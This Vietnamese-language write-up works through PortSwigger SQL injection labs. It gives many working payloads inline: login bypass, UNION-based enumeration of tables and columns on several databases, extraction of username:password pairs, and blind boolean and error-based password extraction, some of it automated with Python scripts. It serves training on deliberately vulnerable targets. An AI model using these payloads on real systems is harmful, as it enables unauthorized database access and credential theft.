![image](https://github.com/user-attachments/assets/d0b40b0a-cf42-407d-be1f-9bc0f417929a)

Bài này khi chọn Refine your search: là nó sẽ dùng method GET để truy vấn, dùng payload `Lifestyle' OR 1 = 1 -- -` là được:

![image](https://github.com/user-attachments/assets/dcb31aeb-f48a-4747-9f9d-13cf08b8a616)

![image](https://github.com/user-attachments/assets/c621cea9-d8ca-457a-a6d1-175d6c691d8d)


<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/a38e82d1-886a-481b-bab5-008608cc1ff8)

![image](https://github.com/user-attachments/assets/025fba22-4c61-44cc-8d01-8454fb089686)

Dùng payload `administrator' OR 1 = 1 -- -` là được vì có vẻ câu truy vấn của nó là `SELECT * FROM tables WHERE username=username AND password=password`:

![image](https://github.com/user-attachments/assets/958e5cf7-2906-467c-8a42-1649c3fde2c3)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/07cf2128-84ca-4559-96f2-0d8c3506f4c4)

![image](https://github.com/user-attachments/assets/e8786188-d83c-486d-8a16-3667129c7c4f)

Trước tiên là check số cột thì tôi có thể thấy nó có 2 cột:

![image](https://github.com/user-attachments/assets/ce930342-2a56-4ee7-bef7-cd911769ecfa)

![image](https://github.com/user-attachments/assets/f26ca492-4c8f-4470-b80f-1526bc3f2102)

a và b đã được lấy ra:

![image](https://github.com/user-attachments/assets/1d003042-e46b-4e42-8efe-9ffaf32f3763)

Tôi chỉ cần payload `Accessories' UNION SELECT banner, 'a' FROM v$version -- -` là ra:

![image](https://github.com/user-attachments/assets/8ab3bf06-8be8-448a-9169-29ee8d80c50e)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/4e201e20-f1d8-49fb-b0d6-a61581b5132b)

Xác định số cột tương tự như câu trước, khác ở chỗ lệnh sql này khác cái kia:

![image](https://github.com/user-attachments/assets/08d7db9f-93b7-4c56-9627-b9bda50dc10a)

Dùng payload `Pets' UNION SELECT @@version, 'a' -- -` với bài này:

![image](https://github.com/user-attachments/assets/7ed85160-bd5f-49a0-a602-81691ba36ba0)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/05ec4e10-3e8d-4a77-a182-b3863a6181b2)

![image](https://github.com/user-attachments/assets/499e030c-a7ad-467f-82d1-c6a527a7ecaf)

Bài này vẫn có 2 cột như trước, đi soi cheat sheet để kiếm lệnh in ra các table:

![image](https://github.com/user-attachments/assets/d7108418-8919-49c8-8e0e-988b8ac17e9f)

Dùng payload `Gifts' UNION SELECT table_name, 'a' FROM information_schema.tables -- -` để in ra các tables có trong database:

![image](https://github.com/user-attachments/assets/c9ffb461-9956-45f1-ab19-f4b2e2d0734c)

Tôi tìm kiếm bảng liên quan đến users:

![image](https://github.com/user-attachments/assets/901148b1-116b-4618-a82a-49863ae7de50)

Dùng payload `Gifts' UNION SELECT column_name, 'a' FROM information_schema.columns WHERE table_name = 'users_tfoynr' -- -` để xem tên cột có trong bảng users_tfoynr:

![image](https://github.com/user-attachments/assets/c2080623-c0be-473e-b3b2-bcaab1234baf)

Dễ thấy bảng này có 3 cột là username, email và password, tôi sẽ lấy username và password thì bảng này:

![image](https://github.com/user-attachments/assets/4897c0c3-e61d-4ec9-a0a0-caac13a7d9b5)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/dbc93a60-6e05-46ea-96ac-a0567ff13d5d)

![image](https://github.com/user-attachments/assets/7c8eba84-4a29-4c38-94a0-7546859b0cc1)

Với Oracle thì payload có hơi khác chút nhưng bản chất vẫn vậy `Pets' UNION SELECT table_name, 'a' FROM all_tables -- -`:

![image](https://github.com/user-attachments/assets/21e4c049-be9d-43eb-88bc-75cf7270e0b9)

Dùng payload `Pets' UNION SELECT column_name, 'a' FROM all_tab_columns WHERE table_name = 'USERS_SMCHQL' -- -` để xem tên của các cột có trong bảng USERS_SMCHQL:

![image](https://github.com/user-attachments/assets/cf0b3aea-7f20-454a-a0c6-33a00af31b92)

Tiếp tục dùng `lmao' UNION SELECT PASSWORD_UOUWOL, USERNAME_RKYQAE FROM USERS_SMCHQL -- -` để lấy username:password, ở đoạn đầu lmao vì bỏ cái có tồn tại đi cho dễ nhìn:

![image](https://github.com/user-attachments/assets/0f6330b7-2772-4111-a610-40f11f75d3ed)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/646f54da-55e7-4785-9d15-45ab50328f30)

Bài này mò cột, chắc thế, không biết nữa `Accessories' UNION SELECT NULL, NULL, NULL -- -`

![image](https://github.com/user-attachments/assets/51bc96b4-9caa-480a-be0b-9f51a9fbe330)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/36279cc1-2d55-4d47-8953-d9e0dd9b7f59)

Sau khi tôi thử các payload như `Pets' UNION SELECT 'hKZWf0', NULL, NULL -- -` sau đó dịch cái dòng chữ sang cột tiếp thì ra:

![image](https://github.com/user-attachments/assets/3309a052-a850-4fa4-b8f9-568492bf8f67)

<h1>---------------------------------------------------------</h1>
<br>
![image](https://github.com/user-attachments/assets/34098d17-b2b1-4545-bc83-ec124aab6122)

Mở đầu là `lmao' UNION SELECT 'a', 'b' -- -`:

![image](https://github.com/user-attachments/assets/661c85fc-a601-489e-b086-1c51ef562c64)

Sau khi dùng payload `lmao' UNION SELECT table_name, NULL FROM information_schema.tables -- -` thì ra được các bảng:

![image](https://github.com/user-attachments/assets/bd93d254-27b8-46d8-85b4-9b11a548189e)

Payload giống giống bài cũ `lmao' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- -`:

![image](https://github.com/user-attachments/assets/05ffb13c-9c07-414f-b7db-12e3d33f6b75)

Và cuối cùng là `lmao' UNION SELECT username, password FROM users -- -`

![image](https://github.com/user-attachments/assets/c6370d13-434e-4da1-8e16-c941349e85f9)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/9233d3a1-7ccd-4815-b446-7457791d2a17)

Sau khi dùng `Pets' UNION SELECT 'a', 'b' -- -` thì lỗi:

![image](https://github.com/user-attachments/assets/53ec4f10-5b23-4b1a-b25e-276906cd0ad5)

Lý do lỗi là do sai kiểu giá trị vì khi tôi để NULL NULL là nó vẫn được:

![image](https://github.com/user-attachments/assets/96c403d4-3d0f-4618-9d2c-1498995ccb76)

Sau khi search qua qua trên mạng thì tôi dùng `lmao'+UNION+SELECT+NULL,username||':'||password+FROM+users--` để lấy username và password:

![image](https://github.com/user-attachments/assets/d91255cb-3d65-4141-96a7-a8a46ec1b84d)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/03078756-9b3b-4c6d-9ec7-93f16ddcb295)

![image](https://github.com/user-attachments/assets/003f9eca-0da1-43a6-a050-4f7695a8d1c8)

Tôi sẽ phải để tâm đến chữ Welcome này và tracking id theo đề bài:

![image](https://github.com/user-attachments/assets/d7f782c1-0365-498d-8205-952bd28525ea)

![image](https://github.com/user-attachments/assets/620cf9f0-1e49-487b-be24-c49779a3be8b)

Nếu đúng tracking id thì có chữ welcome back và ngược lại:

![image](https://github.com/user-attachments/assets/12acaeb5-715a-4576-957b-65770fb48da1)

![image](https://github.com/user-attachments/assets/b6f1298b-04fe-44cd-a7fa-5eea1ab72988)

Thử với `lmao' OR '1' = '1` thì có sqli:

![image](https://github.com/user-attachments/assets/a427992a-16aa-4614-8b8e-a1c58609a031)

Tóm tắt lại thì nếu điều kiện đúng thì sẽ có welcome back và ngược lại là không có, từ đây tôi dùng payload `lmao' OR (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}` trong đây i là số thứ tự của kí tự, char là kí tự kiểm tra, vì mò từng từ mà dùng burp thì hơi mất thời gian (hoặc do tôi không biết dùng) nên tôi code 1 đoạn python để chạy tự động:

![image](https://github.com/user-attachments/assets/ad77ccfa-2a8b-4910-9209-0e06c262c91a)

Bảng chữ thử gồm abcdefghijklmnopqrstuvwxyz0123456789 vì hint bảo mật khẩu chỉ có viết thường và số, chữ A ở cuối để check rằng xem kết thúc mật khẩu chưa, trong lúc đợi thì tôi có dùng payload `lmao' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a` mò và ra được pass dài 20 kí tự:

![image](https://github.com/user-attachments/assets/776a30de-f812-4405-817c-16a7c357b896)

Và đã ra:

![image](https://github.com/user-attachments/assets/624deec3-2d69-4f29-92a5-25fb680cef2b)

Nhập vào để check, code python thì tôi để với tên là blindSQLinjectionwithconditionalresponses.py:

![image](https://github.com/user-attachments/assets/a786b482-815f-4f3a-982c-da99fa587348)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/3f52996e-e65a-4a37-905d-e1b6aa659561)

Giao diện như bài trước:

![image](https://github.com/user-attachments/assets/aa166338-76f5-4e30-bf72-6b52c0665e6d)

Bắt tạm cái request để nghịch trước đã:

![image](https://github.com/user-attachments/assets/7914e24b-9642-4c13-a86c-8d56bf8e2ba0)

Dễ thấy nhất là khi tôi thêm cái dấu ' vào TrackingId là nó bị lỗi

![image](https://github.com/user-attachments/assets/4ea25275-46ce-4a1c-985e-3f7f516ffda8)

Còn đối với `TrackingId=qEqtt92AGDpmILiJ' OR 1 = 1 -- -` hoặc `TrackingId=qEqtt92AGDpmILiJ' OR '1' = '1` thì không có hiện tượng gì xảy ra 

![image](https://github.com/user-attachments/assets/439a3450-d400-4d00-82d5-baeef5b421fa)

Vậy tôi sẽ lợi dụng lỗi để khai thác lỗi

![image](https://github.com/user-attachments/assets/5aa02d7a-6963-476e-92f1-1ca6b103ccda)

Giải thích qua về payload `lmao' OR (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE NULL END FROM users WHERE username='administrator') IS NOT NULL --` thì tôi sử dụng toán tử OR và phần còn lại là lấy kí tự đầu tiên trong cột password ánh xạ với cột admin, nếu kí tự đó là a thì 1/0 tức là lỗi sẽ xảy ra, nếu không phải thì không có gì xảy ra, ở cuối tôi thêm IS NOT NULL để đảm bảo rằng nó không rỗng, nếu thiếu cái nó sẽ lỗi cú pháp và không trở thành 1 điều kiện hợp lệ, còn dấu -- là loại bỏ ' ở cuối. bắt đầu test với burp intruder:

![image](https://github.com/user-attachments/assets/87278229-d1c7-4209-9ce8-ff7fdf48d9a9)

Đã bắt được kí tự t đầu tiên! Vì tôi chả rảnh để ngồi mò từng kí tự trong burp intruder này nên tôi code tạm 1 đoạn python để treo đó, tên file tôi để là blindSQLinjectionwithconditionalerrors.py

![image](https://github.com/user-attachments/assets/0d38e78b-6051-47ed-be61-80890f203d2c)

![image](https://github.com/user-attachments/assets/fb851218-bb15-4279-90c0-6f2708ae23e2)

Ở phần solution của portswigger có dùng payload `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
` dùng nối các kí tự lại với nhau thay vì dùng toán tử và dùng to_char(1/0), nói chung là đều ra được kết quả

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/d79537ff-fa41-4eba-875b-fd64a358e8e3)

Như bài trước, tôi cũng test với `gE6tOLwYzmJqyFvr' OR '1'='1` và `gE6tOLwYzmJqyFvr'` thì là các kết quả khác nhau:

![image](https://github.com/user-attachments/assets/71c2d204-1d37-42c9-9014-2c7496540fc7)

![image](https://github.com/user-attachments/assets/501c7307-cf03-4d4e-aacb-586a05a6ee79)

Khi tôi dùng payload của bài trước thì ăn lỗi, có vẻ liên quan tới kiểu giá trị:

![image](https://github.com/user-attachments/assets/db7fd551-d4c5-495a-bf6f-986cc0ed56fe)

Tôi sẽ thử sử dụng CAST để ép kiểu:

![image](https://github.com/user-attachments/assets/644b1cac-4cd0-494b-a22c-70d7b1b2b703)

![image](https://github.com/user-attachments/assets/dc6da20b-a2ae-441d-a8cf-3d95f3489ae5)

Tôi dùng payload `gE6tOLwYzmJqyFvr' OR CAST((SELECT 1) AS int) -- -` thì yêu cầu bắt buộc phải là kiểu boolean

![image](https://github.com/user-attachments/assets/1affeb29-5b20-4601-8257-923ac26c2478)

Tôi thêm `gE6tOLwYzmJqyFvr' OR CAST((SELECT 1) AS int)=2 -- -` vào là ok, không ăn lỗi

![image](https://github.com/user-attachments/assets/5a154734-3b75-4262-8d22-7777080e5c5d)

![image](https://github.com/user-attachments/assets/e166eb0a-380f-4688-b057-5ec4cb34a3a0)

Thử mấy cái payload khác vẫn ăn lỗi:v, bí quá đọc thử solution thì ngó được payload `' AND 1=CAST((SELECT username FROM users) AS int)--`

![image](https://github.com/user-attachments/assets/ef0c5133-0e0f-4bd4-9500-46f8fe2bca50)

Có vẻ cái kia lấy về cả đống password, tôi thử đổi sang `' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int) --`

![image](https://github.com/user-attachments/assets/c5fa4d15-e8c1-4b4b-972a-125064a47e06)

Ăn lỗi tiếp, nhưng khi dùng `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` lại có thể ra được password ở phần lỗi:

![image](https://github.com/user-attachments/assets/73adbbb0-4da0-4cd8-a671-ee1403e3e9dd)

Căn bản thì đây là blackbox nên không biết cái câu query nó trông như nào

<h1>---------------------------------------------------------</h1>
<br>

